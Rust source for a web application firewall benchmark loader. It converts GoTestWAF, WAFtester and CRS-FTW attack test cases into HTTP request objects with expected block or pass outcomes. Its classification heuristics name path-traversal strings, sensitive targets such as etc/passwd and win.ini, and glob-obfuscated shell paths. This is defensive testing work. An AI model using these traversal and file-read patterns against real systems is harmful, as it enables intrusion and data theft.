//! 外部评测集加载：GoTestWAF / WAFtester / CRS-FTW → PreparedCase。

use crate::bench::PreparedCase;
use nerve_antibody_engine::NativeRequest;
use serde::Deserialize;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use tracing::{info, warn};

pub fn resolve_vendor_dataset(name: &str) -> Option<PathBuf> {
    let env_key = match name {
        "gotestwaf" => "GOTESTWAF_ROOT",
        "waftester" => "WAFTESTER_ROOT",
        "crs-ftw" => "CRS_FTW_ROOT",
        _ => return None,
    };
    if let Ok(p) = std::env::var(env_key) {
        let pb = PathBuf::from(p);
        if pb.is_dir() {
            return Some(pb);
        }
    }
    let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let vendor = manifest.join("../../vendor").join(name);
    if vendor.is_dir() {
        return Some(vendor.canonicalize().unwrap_or(vendor));
    }
    let tmp = PathBuf::from(format!("/tmp/{name}"));
    if tmp.is_dir() {
        return Some(tmp);
    }
    None
}

pub fn dataset_ready(name: &str) -> (bool, String, String) {
    match name {
        "gotestwaf" => match resolve_vendor_dataset("gotestwaf") {
            Some(root) if root.join("testcases").is_dir() => (
                true,
                root.display().to_string(),
                format!("GoTestWAF 样本就绪 · {}", root.display()),
            ),
            _ => (
                false,
                String::new(),
                "未找到 GoTestWAF（执行 bash scripts/fetch-gotestwaf.sh）".into(),
            ),
        },
        "waftester" => match resolve_vendor_dataset("waftester") {
            Some(root) if root.join("payloads").is_dir() => (
                true,
                root.display().to_string(),
                format!("WAFtester payloads 就绪 · {}", root.display()),
            ),
            _ => (
                false,
                String::new(),
                "未找到 WAFtester payloads（执行 bash scripts/fetch-waftester.sh）".into(),
            ),
        },
        "crs-ftw" => match resolve_vendor_dataset("crs-ftw") {
            Some(root) => {
                let tests = crs_tests_dir(&root);
                if tests.is_dir() {
                    (
                        true,
                        root.display().to_string(),
                        format!("CRS/FTW 回归就绪 · {}", tests.display()),
                    )
                } else {
                    (
                        false,
                        root.display().to_string(),
                        "CRS 目录存在但缺少 tests/regression/tests".into(),
                    )
                }
            }
            None => (
                false,
                String::new(),
                "未找到 CRS/FTW（执行 bash scripts/fetch-crs-ftw.sh）".into(),
            ),
        },
        _ => (false, String::new(), format!("未知数据源: {name}")),
    }
}

fn crs_tests_dir(root: &Path) -> PathBuf {
    let a = root.join("tests/regression/tests");
    if a.is_dir() {
        return a;
    }
    let b = root.join("coreruleset/tests/regression/tests");
    if b.is_dir() {
        return b;
    }
    a
}

// ---------- GoTestWAF ----------

#[derive(Debug, Deserialize)]
struct GoTestFile {
    #[serde(default)]
    payload: Vec<String>,
    #[serde(default)]
    encoder: Vec<String>,
    #[serde(default)]
    placeholder: Vec<serde_yaml::Value>,
    #[serde(default)]
    r#type: String,
}

pub fn load_gotestwaf_cases(root: &Path, limit: u64) -> Result<Vec<PreparedCase>, String> {
    let tc = root.join("testcases");
    if !tc.is_dir() {
        return Err(format!("缺少 testcases: {}", tc.display()));
    }
    let mut files = Vec::new();
    collect_yaml_files(&tc, &mut files)?;
    files.sort();
    let mut out = Vec::new();
    for path in files {
        let text = std::fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
        // GoTestWAF payload 常含 `\'` 等非 YAML 转义（如 xss-scripting.yml），需先规范化。
        let text = sanitize_gotestwaf_yaml(&text);
        let doc: GoTestFile = serde_yaml::from_str(&text)
            .map_err(|e| format!("parse {}: {e}", path.display()))?;
        let rel = path
            .strip_prefix(root)
            .unwrap_or(&path)
            .display()
            .to_string()
            .replace('\\', "/");
        let is_fp = rel.contains("false-pos") || rel.contains("false_pos");
        let encoders = if doc.encoder.is_empty() {
            vec!["Plain".into()]
        } else {
            doc.encoder.clone()
        };
        let placeholders = if doc.placeholder.is_empty() {
            vec![serde_yaml::Value::String("URLParam".into())]
        } else {
            doc.placeholder.clone()
        };
        let mut idx = 0u32;
        for payload in &doc.payload {
            for enc in &encoders {
                let encoded = encode_payload(payload, enc);
                for ph in &placeholders {
                    let (ph_name, req) = placeholder_to_request(ph, &encoded);
                    idx += 1;
                    let id = format!("{rel}#{idx}/{enc}/{ph_name}");
                    out.push(PreparedCase {
                        id: id.clone(),
                        suite: "gotestwaf".into(),
                        kind: if is_fp { "white".into() } else { "black".into() },
                        name: format!(
                            "{} · {}",
                            if doc.r#type.is_empty() {
                                path.file_stem()
                                    .and_then(|s| s.to_str())
                                    .unwrap_or("case")
                            } else {
                                doc.r#type.as_str()
                            },
                            truncate(&encoded, 48)
                        ),
                        expect: if is_fp { "pass".into() } else { "block".into() },
                        req,
                    });
                    if limit > 0 && out.len() as u64 >= limit {
                        return Ok(out);
                    }
                }
            }
        }
    }
    info!(loaded = out.len(), "gotestwaf cases loaded");
    if out.is_empty() {
        return Err("GoTestWAF 用例为空".into());
    }
    Ok(out)
}

/// 规范化 GoTestWAF YAML 中双引号列表项里的非法转义。
///
/// YAML 双引号只认有限转义集；样本里常见 `\'`（如 xss-scripting.yml 第 29 行），
/// 严格解析会失败。按行处理 `  - "..."` 项，避免误伤纯文本中的引号。
fn sanitize_gotestwaf_yaml(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for (i, line) in input.lines().enumerate() {
        if i > 0 {
            out.push('\n');
        }
        if let Some((prefix, inner, suffix)) = split_double_quoted_list_item(line) {
            out.push_str(prefix);
            out.push('"');
            out.push_str(&sanitize_yaml_dq_inner(inner));
            out.push('"');
            out.push_str(suffix);
        } else {
            out.push_str(line);
        }
    }
    if input.ends_with('\n') {
        out.push('\n');
    }
    out
}

/// 匹配 `  - "...."可选尾` 形式的列表项，返回 (前缀含 `- `、引号内、后缀)。
fn split_double_quoted_list_item(line: &str) -> Option<(&str, &str, &str)> {
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < bytes.len() && (bytes[i] == b' ' || bytes[i] == b'\t') {
        i += 1;
    }
    if i + 1 >= bytes.len() || bytes[i] != b'-' {
        return None;
    }
    i += 1;
    if i >= bytes.len() || (bytes[i] != b' ' && bytes[i] != b'\t') {
        return None;
    }
    while i < bytes.len() && (bytes[i] == b' ' || bytes[i] == b'\t') {
        i += 1;
    }
    if i >= bytes.len() || bytes[i] != b'"' {
        return None;
    }
    let prefix = &line[..i];
    let after_open = i + 1;
    // 找未转义的结束引号（此时转义尚未规范化，按 `\\` 成对、`\"` 为转义引号扫描）
    let rest = &line[after_open..];
    let mut chars = rest.char_indices();
    let mut end = None;
    while let Some((off, c)) = chars.next() {
        if c == '\\' {
            let _ = chars.next(); // 跳过下一字符（无论是否合法转义）
            continue;
        }
        if c == '"' {
            end = Some(off);
            break;
        }
    }
    let end = end?;
    let inner = &rest[..end];
    let suffix = &rest[end + 1..];
    Some((prefix, inner, suffix))
}

fn sanitize_yaml_dq_inner(inner: &str) -> String {
    let mut out = String::with_capacity(inner.len());
    let mut chars = inner.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        let Some(&next) = chars.peek() else {
            out.push('\\');
            continue;
        };
        if is_yaml_double_quote_escape(next) {
            out.push('\\');
            out.push(chars.next().unwrap());
            let hex_len = match next {
                'x' => 2,
                'u' => 4,
                'U' => 8,
                _ => 0,
            };
            for _ in 0..hex_len {
                match chars.peek().copied() {
                    Some(h) if h.is_ascii_hexdigit() => out.push(chars.next().unwrap()),
                    _ => break,
                }
            }
        } else {
            // 非法转义 → 字面反斜杠 + 下一字符（\' → \\'）
            out.push('\\');
            out.push('\\');
            out.push(chars.next().unwrap());
        }
    }
    out
}

fn is_yaml_double_quote_escape(c: char) -> bool {
    matches!(
        c,
        '0' | 'a' | 'b' | 't' | 'n' | 'v' | 'f' | 'r' | 'e' | ' '
            | '"' | '/' | '\\' | 'N' | '_' | 'L' | 'P' | 'x' | 'u' | 'U'
    )
}

fn encode_payload(payload: &str, encoder: &str) -> String {
    match encoder.to_ascii_lowercase().as_str() {
        "url" => urlencoding::encode(payload).into_owned(),
        "base64" | "base64flat" => {
            use base64::Engine;
            base64::engine::general_purpose::STANDARD.encode(payload.as_bytes())
        }
        "base64url" => {
            use base64::Engine;
            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(payload.as_bytes())
        }
        _ => payload.to_string(), // Plain / unknown
    }
}

fn placeholder_to_request(ph: &serde_yaml::Value, encoded: &str) -> (String, NativeRequest) {
    let (name, spec) = match ph {
        serde_yaml::Value::String(s) => (s.clone(), None),
        serde_yaml::Value::Mapping(m) => {
            let (k, v) = match m.iter().next() {
                Some((k, v)) => (k.clone(), Some(v.clone())),
                None => (serde_yaml::Value::String("URLParam".into()), None),
            };
            (
                k.as_str().unwrap_or("URLParam").to_string(),
                v,
            )
        }
        _ => ("URLParam".into(), None),
    };
    let mut headers = HashMap::new();
    headers.insert("Host".into(), "gotestwaf.local".into());
    headers.insert("User-Agent".into(), "nerve-gotestwaf-runner/1.0".into());
    let req = match name.as_str() {
        "URLPath" => NativeRequest {
            method: "GET".into(),
            host: "gotestwaf.local".into(),
            uri: format!("/{}", encoded.trim_start_matches('/')),
            query: String::new(),
            headers,
            body: String::new(),
            ..Default::default()
        },
        "Header" => {
            headers.insert("X-Nerve-Test".into(), encoded.into());
            NativeRequest {
                method: "GET".into(),
                host: "gotestwaf.local".into(),
                uri: "/".into(),
                query: String::new(),
                headers,
                body: String::new(),
                ..Default::default()
            }
        }
        "UserAgent" => {
            headers.insert("User-Agent".into(), encoded.into());
            NativeRequest {
                method: "GET".into(),
                host: "gotestwaf.local".into(),
                uri: "/".into(),
                query: String::new(),
                headers,
                body: String::new(),
                ..Default::default()
            }
        }
        "JSONRequest" | "JSONBody" => {
            headers.insert("Content-Type".into(), "application/json".into());
            let body = serde_json::json!({ "q": encoded }).to_string();
            NativeRequest {
                method: "POST".into(),
                host: "gotestwaf.local".into(),
                uri: "/api".into(),
                query: String::new(),
                headers,
                body,
                ..Default::default()
            }
        }
        "HTMLForm" | "RequestBody" => {
            headers.insert(
                "Content-Type".into(),
                "application/x-www-form-urlencoded".into(),
            );
            NativeRequest {
                method: "POST".into(),
                host: "gotestwaf.local".into(),
                uri: "/".into(),
                query: String::new(),
                headers,
                body: format!("q={encoded}"),
                ..Default::default()
            }
        }
        "HTMLMultipartForm" => {
            let boundary = "----NerveBoundary";
            headers.insert(
                "Content-Type".into(),
                format!("multipart/form-data; boundary={boundary}"),
            );
            let body = format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n{encoded}\r\n--{boundary}--\r\n"
            );
            NativeRequest {
                method: "POST".into(),
                host: "gotestwaf.local".into(),
                uri: "/".into(),
                query: String::new(),
                headers,
                body,
                ..Default::default()
            }
        }
        "SOAPBody" | "XMLBody" => {
            headers.insert("Content-Type".into(), "text/xml".into());
            NativeRequest {
                method: "POST".into(),
                host: "gotestwaf.local".into(),
                uri: "/".into(),
                query: String::new(),
                headers,
                body: format!("<root><q>{encoded}</q></root>"),
                ..Default::default()
            }
        }
        "RawRequest" => {
            let m = spec.as_ref().and_then(|v| v.as_mapping());
            let method = m
                .and_then(|m| m.get(serde_yaml::Value::from("method")))
                .or_else(|| m.and_then(|m| m.get(serde_yaml::Value::from("Method"))))
                .and_then(|v| v.as_str())
                .unwrap_or("POST");
            let path = m
                .and_then(|m| m.get(serde_yaml::Value::from("path")))
                .or_else(|| m.and_then(|m| m.get(serde_yaml::Value::from("Path"))))
                .and_then(|v| v.as_str())
                .unwrap_or("/");
            let body_tpl = m
                .and_then(|m| m.get(serde_yaml::Value::from("body")))
                .or_else(|| m.and_then(|m| m.get(serde_yaml::Value::from("Body"))))
                .and_then(|v| v.as_str())
                .unwrap_or("{{payload}}");
            let body = body_tpl.replace("{{payload}}", encoded);
            if let Some(hm) = m.and_then(|m| m.get(serde_yaml::Value::from("headers"))) {
                if let Some(hdrs) = hm.as_mapping() {
                    for (k, v) in hdrs {
                        if let (Some(kn), Some(vs)) = (k.as_str(), v.as_str()) {
                            headers.insert(kn.to_string(), vs.to_string());
                        }
                    }
                }
            }
            NativeRequest {
                method: method.to_string(),
                host: "gotestwaf.local".into(),
                uri: path.to_string(),
                query: String::new(),
                headers,
                body,
                ..Default::default()
            }
        }
        // URLParam / default fallback
        _ => NativeRequest {
            method: "GET".into(),
            host: "gotestwaf.local".into(),
            uri: "/".into(),
            query: format!("q={encoded}"),
            headers,
            body: String::new(),
            ..Default::default()
        },
    };
    (name, req)
}

// ---------- WAFtester ----------

#[derive(Debug, Deserialize)]
struct WafTesterItem {
    #[serde(default)]
    id: String,
    #[serde(default)]
    payload: String,
    #[serde(default)]
    expected_block: Option<bool>,
    #[serde(default)]
    category: String,
    #[serde(default)]
    notes: String,
    #[serde(default)]
    #[allow(dead_code)]
    tags: Vec<String>,
    #[serde(default)]
    method: String,
    #[serde(default)]
    body: String,
    #[serde(default)]
    endpoint: String,
    #[serde(default)]
    headers: HashMap<String, String>,
    /// 多请求压测（如 rate-limit burst）；单次 inspect 无法模拟，跳过计入检出率。
    #[serde(default)]
    repeat: Option<u32>,
}

pub fn load_waftester_cases(root: &Path, limit: u64) -> Result<Vec<PreparedCase>, String> {
    let payloads = root.join("payloads");
    if !payloads.is_dir() {
        return Err(format!("缺少 payloads: {}", payloads.display()));
    }
    let mut files = Vec::new();
    collect_json_files(&payloads, &mut files)?;
    files.sort();
    let mut out = Vec::new();
    for path in files {
        // ids-map 等元数据跳过
        if path
            .file_name()
            .and_then(|s| s.to_str())
            .is_some_and(|n| n == "ids-map.json")
        {
            continue;
        }
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(e) => {
                warn!(path = %path.display(), error = %e, "skip waftester file");
                continue;
            }
        };
        let items: Vec<WafTesterItem> = match serde_json::from_str(&text) {
            Ok(v) => v,
            Err(e) => {
                warn!(path = %path.display(), error = %e, "skip invalid waftester json");
                continue;
            }
        };
        let rel = path
            .strip_prefix(root)
            .unwrap_or(&path)
            .display()
            .to_string()
            .replace('\\', "/");
        for (i, it) in items.into_iter().enumerate() {
            if it.payload.trim().is_empty() {
                continue;
            }
            // 单包引擎无法复现 burst/rate-limit 的 repeat 语义
            if it.repeat.unwrap_or(1) > 1 {
                continue;
            }
            let expect_block = it.expected_block.unwrap_or(true);
            let id = if it.id.is_empty() {
                format!("{rel}#{i}")
            } else {
                format!("{rel}/{}", it.id)
            };
            let req = waftester_item_to_request(&it);
            let name = if it.notes.is_empty() {
                format!(
                    "{} · {}",
                    if it.category.is_empty() {
                        "payload"
                    } else {
                        &it.category
                    },
                    truncate(&it.payload, 40)
                )
            } else {
                truncate(&it.notes, 80)
            };
            out.push(PreparedCase {
                id,
                suite: "waftester".into(),
                kind: if expect_block {
                    "black".into()
                } else {
                    "white".into()
                },
                name,
                expect: if expect_block {
                    "block".into()
                } else {
                    "pass".into()
                },
                req,
            });
            if limit > 0 && out.len() as u64 >= limit {
                return Ok(out);
            }
        }
    }
    info!(loaded = out.len(), "waftester cases loaded");
    if out.is_empty() {
        return Err("WAFtester 用例为空".into());
    }
    Ok(out)
}

fn waftester_item_to_request(it: &WafTesterItem) -> NativeRequest {
    // 结构化 body/method（如 n8n）：路径在 payload，攻击面在 body
    if !it.body.trim().is_empty() {
        let path = if !it.endpoint.trim().is_empty() {
            it.endpoint.trim()
        } else {
            it.payload.trim()
        };
        let (uri, query) = match path.split_once('?') {
            Some((u, q)) => (u.to_string(), q.to_string()),
            None => {
                let u = if path.starts_with('/') {
                    path.to_string()
                } else if path.is_empty() {
                    "/".into()
                } else {
                    format!("/{path}")
                };
                (u, String::new())
            }
        };
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        for (k, v) in &it.headers {
            headers.insert(k.clone(), v.clone());
        }
        if !headers
            .keys()
            .any(|k| k.eq_ignore_ascii_case("content-type"))
        {
            headers.insert("Content-Type".into(), "application/json".into());
        }
        let method = if it.method.trim().is_empty() {
            "POST".into()
        } else {
            it.method.trim().to_ascii_uppercase()
        };
        return NativeRequest {
            method,
            host: "waftester.local".into(),
            uri,
            query,
            headers,
            body: it.body.clone(),
            ..Default::default()
        };
    }
    let mut req = waftester_payload_to_request(&it.payload);
    if !it.method.trim().is_empty() {
        req.method = it.method.trim().to_ascii_uppercase();
    }
    for (k, v) in &it.headers {
        req.headers.insert(k.clone(), v.clone());
    }
    req
}

fn waftester_payload_to_request(payload: &str) -> NativeRequest {
    let p = payload.trim_start();
    if p.starts_with("GET ")
        || p.starts_with("POST ")
        || p.starts_with("PUT ")
        || p.starts_with("DELETE ")
        || p.starts_with("HEAD ")
        || p.starts_with("PATCH ")
    {
        // 可能是 raw HTTP；补齐空行
        let raw = if p.contains("\r\n\r\n") || p.contains("\n\n") {
            payload.to_string()
        } else {
            format!("{payload}\r\n\r\n")
        };
        if let Ok(req) = crate::bench::parse_raw_http_pub(&raw) {
            return req;
        }
    }

    // HTTP/2 伪头块（`:method GET` 空格分隔，非 raw HTTP 也非 `Header: val`）
    if looks_like_http2_pseudo_block(p) {
        return waftester_http2_pseudo_to_request(p);
    }

    // 单行「Header: value」→ 写入对应头（常见 UA / XFF CRLF 样本）
    if let Some((name, val)) = split_single_header_line(p) {
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert(name.clone(), val);
        if !name.eq_ignore_ascii_case("user-agent") {
            headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        }
        return NativeRequest {
            method: "GET".into(),
            host: "waftester.local".into(),
            uri: "/".into(),
            query: String::new(),
            headers,
            body: String::new(),
            ..Default::default()
        };
    }

    // Glob shell（`/???/cat`）整段进 URI，避免 `?` 被拆成 query
    if p.contains("/???/") || p.contains("/????/") || p.starts_with(";/") && p.contains("???") {
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        let (uri, query) = if p.starts_with(';') {
            ("/".into(), format!("q={}", p))
        } else {
            let uri = if p.starts_with('/') {
                p.to_string()
            } else {
                format!("/{p}")
            };
            (uri, String::new())
        };
        return NativeRequest {
            method: "GET".into(),
            host: "waftester.local".into(),
            uri,
            query,
            headers,
            body: String::new(),
            ..Default::default()
        };
    }

    // JWT → 仅写入 query（曾同时写 Authorization 时 header 解码耗尽正则预算，导致 query 规则漏匹配）
    if looks_like_jwt_payload(p) {
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        return NativeRequest {
            method: "GET".into(),
            host: "waftester.local".into(),
            uri: "/api".into(),
            query: format!("access_token={}", urlencoding::encode(p)),
            headers,
            body: String::new(),
            ..Default::default()
        };
    }

    // 路径穿越 / 绝对路径敏感文件 → 放进 URI，贴近真实 LFI
    if looks_like_path_payload(p) {
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        let uri = if p.starts_with('/') {
            p.to_string()
        } else {
            format!("/{p}")
        };
        return NativeRequest {
            method: "GET".into(),
            host: "waftester.local".into(),
            uri,
            query: String::new(),
            headers,
            body: String::new(),
            ..Default::default()
        };
    }

    // 应用路径（含 query）→ URI，贴近真实探测/强制浏览/OAuth 端点
    if looks_like_uri_path_payload(p) {
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        let (uri, query) = crate::bench::split_request_target(p);
        return NativeRequest {
            method: "GET".into(),
            host: "waftester.local".into(),
            uri,
            query,
            headers,
            body: String::new(),
            ..Default::default()
        };
    }

    // JSON / GraphQL 文档 → body
    if looks_like_json_payload(p) {
        let mut headers = HashMap::new();
        headers.insert("Host".into(), "waftester.local".into());
        headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
        headers.insert("Content-Type".into(), "application/json".into());
        let uri = if p.to_ascii_lowercase().contains("__schema")
            || p.to_ascii_lowercase().contains("__type")
            || p.contains("\"query\"")
        {
            "/graphql".into()
        } else {
            "/api".into()
        };
        return NativeRequest {
            method: "POST".into(),
            host: "waftester.local".into(),
            uri,
            query: String::new(),
            headers,
            body: p.to_string(),
            ..Default::default()
        };
    }

    let mut headers = HashMap::new();
    headers.insert("Host".into(), "waftester.local".into());
    headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
    NativeRequest {
        method: "GET".into(),
        host: "waftester.local".into(),
        uri: "/".into(),
        query: format!("q={}", urlencoding::encode(payload)),
        headers,
        body: String::new(),
        ..Default::default()
    }
}

fn looks_like_jwt_payload(p: &str) -> bool {
    let t = p.trim();
    t.starts_with("eyJ") && t.matches('.').count() >= 1 && t.len() >= 20 && t.len() < 8192
}

fn looks_like_http2_pseudo_block(p: &str) -> bool {
    let t = p.trim_start();
    t.starts_with(":method ")
        || t.starts_with(":path ")
        || (t.starts_with(':') && (t.contains(":path ") || t.contains(":authority ")))
}

fn waftester_http2_pseudo_to_request(payload: &str) -> NativeRequest {
    let mut headers = HashMap::new();
    headers.insert("Host".into(), "waftester.local".into());
    headers.insert("User-Agent".into(), "nerve-waftester-runner/1.0".into());
    let normalized = payload.replace('\r', "\n");
    for line in normalized.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        if let Some(rest) = line.strip_prefix(':') {
            if let Some((key, val)) = rest.split_once(' ') {
                headers.insert(format!(":{}", key.trim()), val.trim().to_string());
            }
            continue;
        }
        if let Some((k, v)) = line.split_once(':') {
            let k = k.trim();
            let v = v.trim();
            if !k.is_empty() && !v.is_empty() {
                headers.insert(k.to_string(), v.to_string());
            }
        }
    }
    let method = headers
        .get(":method")
        .cloned()
        .unwrap_or_else(|| "GET".into());
    let uri = headers
        .get(":path")
        .cloned()
        .unwrap_or_else(|| "/".into());
    NativeRequest {
        method,
        host: headers
            .get(":authority")
            .cloned()
            .unwrap_or_else(|| "waftester.local".into()),
        uri,
        query: String::new(),
        headers,
        body: String::new(),
        ..Default::default()
    }
}

fn split_single_header_line(p: &str) -> Option<(String, String)> {
    if p.contains('\n') || p.contains('\r') {
        return None;
    }
    let (name, val) = p.split_once(':')?;
    let name = name.trim();
    let val = val.trim();
    if name.is_empty() || val.is_empty() || name.contains(' ') || name.len() > 64 {
        return None;
    }
    // 仅接受常见可注入头，避免把 `http://...` 误判成头
    let ok = name.eq_ignore_ascii_case("user-agent")
        || name.eq_ignore_ascii_case("referer")
        || name.eq_ignore_ascii_case("cookie")
        || name.eq_ignore_ascii_case("x-forwarded-for")
        || name.eq_ignore_ascii_case("x-real-ip")
        || name.eq_ignore_ascii_case("host")
        || name.eq_ignore_ascii_case("x-original-url")
        || name.eq_ignore_ascii_case("x-rewrite-url");
    if !ok {
        return None;
    }
    Some((name.to_string(), val.to_string()))
}

fn looks_like_path_payload(p: &str) -> bool {
    let t = p.trim();
    if t.len() < 4 || t.len() > 512 {
        return false;
    }
    if t.contains(' ') && !t.contains("../") && !t.contains("..\\") {
        return false;
    }
    let lower = t.to_ascii_lowercase();
    lower.starts_with("../")
        || lower.starts_with("..\\")
        || lower.starts_with("..../")
        || lower.starts_with("....\\")
        || lower.starts_with("/etc/")
        || lower.starts_with("/var/")
        || lower.starts_with("/tmp/")
        || lower.starts_with("/proc/")
        || lower.starts_with("/root/")
        || lower.starts_with("/home/")
        || lower.starts_with("c:\\")
        || lower.starts_with("c:/")
        || lower.contains("etc/passwd")
        || lower.contains("windows/win.ini")
        || lower.contains("web.config")
        || lower.contains("%2e%2e")
        || lower.contains("%c0%af")
        || lower.contains("..%2f")
}

fn looks_like_uri_path_payload(p: &str) -> bool {
    let t = p.trim();
    // 单斜杠路径；排除协议相对 `//host`（留给开放重定向样本）
    if !t.starts_with('/') || t.starts_with("//") || t.len() < 2 || t.len() > 2048 {
        return false;
    }
    if t.contains('\n') || t.contains('\r') {
        return false;
    }
    // 允许占位符 <slug> 与百分号编码
    let path = t.split('?').next().unwrap_or(t);
    path.bytes().all(|b| {
        b.is_ascii_alphanumeric()
            || matches!(
                b,
                b'/'
                    | b'-'
                    | b'_'
                    | b'.'
                    | b'~'
                    | b'%'
                    | b':'
                    | b'@'
                    | b'+'
                    | b'='
                    | b'<'
                    | b'>'
                    | b','
            )
    })
}

fn looks_like_json_payload(p: &str) -> bool {
    let t = p.trim_start();
    if t.len() < 2 || t.len() > 65536 {
        return false;
    }
    (t.starts_with('{') || t.starts_with('['))
        && (t.contains(':') || t.contains("query") || t.contains('$'))
}

// ---------- CRS FTW ----------

#[derive(Debug, Deserialize)]
struct FtwFile {
    #[serde(default)]
    rule_id: serde_yaml::Value,
    #[serde(default)]
    tests: Vec<FtwTest>,
}

#[derive(Debug, Deserialize)]
struct FtwTest {
    #[serde(default)]
    test_id: serde_yaml::Value,
    #[serde(default)]
    desc: String,
    #[serde(default)]
    stages: Vec<FtwStage>,
}

#[derive(Debug, Deserialize)]
struct FtwStage {
    #[serde(default)]
    input: FtwInput,
    #[serde(default)]
    output: FtwOutput,
}

#[derive(Debug, Default, Deserialize)]
struct FtwInput {
    #[serde(default)]
    method: String,
    #[serde(default)]
    uri: String,
    #[serde(default)]
    data: String,
    #[serde(default)]
    headers: HashMap<String, String>,
    #[serde(default)]
    dest_addr: String,
}

#[derive(Debug, Default, Deserialize)]
struct FtwOutput {
    #[serde(default)]
    log: Option<FtwLog>,
    #[serde(default)]
    status: Option<u16>,
    #[serde(default)]
    no_log: Option<serde_yaml::Value>,
}

#[derive(Debug, Default, Deserialize)]
struct FtwLog {
    #[serde(default)]
    expect_ids: Vec<serde_yaml::Value>,
}

pub fn load_crs_ftw_cases(root: &Path, limit: u64) -> Result<Vec<PreparedCase>, String> {
    let tests_dir = crs_tests_dir(root);
    if !tests_dir.is_dir() {
        return Err(format!("缺少 CRS tests: {}", tests_dir.display()));
    }
    let mut files = Vec::new();
    collect_yaml_files(&tests_dir, &mut files)?;
    files.sort();
    let mut out = Vec::new();
    for path in files {
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(e) => {
                warn!(path = %path.display(), error = %e, "skip ftw file");
                continue;
            }
        };
        // FTW 文件常以 --- 开头
        let text = text.trim_start_matches("---").trim_start();
        let doc: FtwFile = match serde_yaml::from_str(text) {
            Ok(d) => d,
            Err(e) => {
                warn!(path = %path.display(), error = %e, "skip invalid ftw yaml");
                continue;
            }
        };
        let rel = path
            .strip_prefix(root)
            .unwrap_or(&path)
            .display()
            .to_string()
            .replace('\\', "/");
        let rule = yaml_scalar(&doc.rule_id);
        for t in doc.tests {
            let Some(stage) = t.stages.first() else {
                continue;
            };
            let expect_block = stage
                .output
                .log
                .as_ref()
                .map(|l| !l.expect_ids.is_empty())
                .unwrap_or(false)
                || stage
                    .output
                    .status
                    .map(|s| s == 403 || s == 406)
                    .unwrap_or(false);
            // 纯 no_log 负向用例 → white
            let is_negative = stage.output.no_log.is_some() && !expect_block;
            let method = if stage.input.method.is_empty() {
                "GET".into()
            } else {
                stage.input.method.clone()
            };
            let uri = if stage.input.uri.is_empty() {
                "/".into()
            } else {
                stage.input.uri.clone()
            };
            let (uri, query) = match uri.split_once('?') {
                Some((u, q)) => (u.to_string(), q.to_string()),
                None => (uri, String::new()),
            };
            let mut headers = stage.input.headers.clone();
            if !headers.keys().any(|k| k.eq_ignore_ascii_case("host")) {
                headers.insert(
                    "Host".into(),
                    if stage.input.dest_addr.is_empty() {
                        "crs-ftw.local".into()
                    } else {
                        stage.input.dest_addr.clone()
                    },
                );
            }
            let tid = yaml_scalar(&t.test_id);
            let id = format!("{rel}#r{rule}-t{tid}");
            let name = if t.desc.is_empty() {
                format!("CRS {rule}/{tid}")
            } else {
                truncate(&t.desc, 80)
            };
            out.push(PreparedCase {
                id,
                suite: "crs-ftw".into(),
                kind: if expect_block && !is_negative {
                    "black".into()
                } else {
                    "white".into()
                },
                name,
                expect: if expect_block && !is_negative {
                    "block".into()
                } else {
                    "pass".into()
                },
                req: NativeRequest {
                    method,
                    host: headers
                        .get("Host")
                        .cloned()
                        .unwrap_or_else(|| "crs-ftw.local".into()),
                    uri,
                    query,
                    headers,
                    body: stage.input.data.clone(),
                    ..Default::default()
                },
            });
            if limit > 0 && out.len() as u64 >= limit {
                return Ok(out);
            }
        }
    }
    info!(loaded = out.len(), "crs-ftw cases loaded");
    if out.is_empty() {
        return Err("CRS/FTW 用例为空".into());
    }
    Ok(out)
}

fn yaml_scalar(v: &serde_yaml::Value) -> String {
    match v {
        serde_yaml::Value::Number(n) => n.to_string(),
        serde_yaml::Value::String(s) => s.clone(),
        serde_yaml::Value::Bool(b) => b.to_string(),
        _ => String::new(),
    }
}

fn collect_yaml_files(dir: &Path, out: &mut Vec<PathBuf>) -> Result<(), String> {
    let rd = std::fs::read_dir(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    for ent in rd.flatten() {
        let p = ent.path();
        if p.is_dir() {
            collect_yaml_files(&p, out)?;
        } else if let Some(name) = p.file_name().and_then(|s| s.to_str()) {
            if name.ends_with(".yml") || name.ends_with(".yaml") {
                out.push(p);
            }
        }
    }
    Ok(())
}

fn collect_json_files(dir: &Path, out: &mut Vec<PathBuf>) -> Result<(), String> {
    let rd = std::fs::read_dir(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    for ent in rd.flatten() {
        let p = ent.path();
        if p.is_dir() {
            collect_json_files(&p, out)?;
        } else if let Some(name) = p.file_name().and_then(|s| s.to_str()) {
            if name.ends_with(".json") {
                out.push(p);
            }
        }
    }
    Ok(())
}

fn truncate(s: &str, max: usize) -> String {
    let mut t = s.replace('\n', " ").replace('\r', " ");
    if t.chars().count() > max {
        t = t.chars().take(max).collect::<String>() + "…";
    }
    t
}

#[cfg(test)]
mod tests {
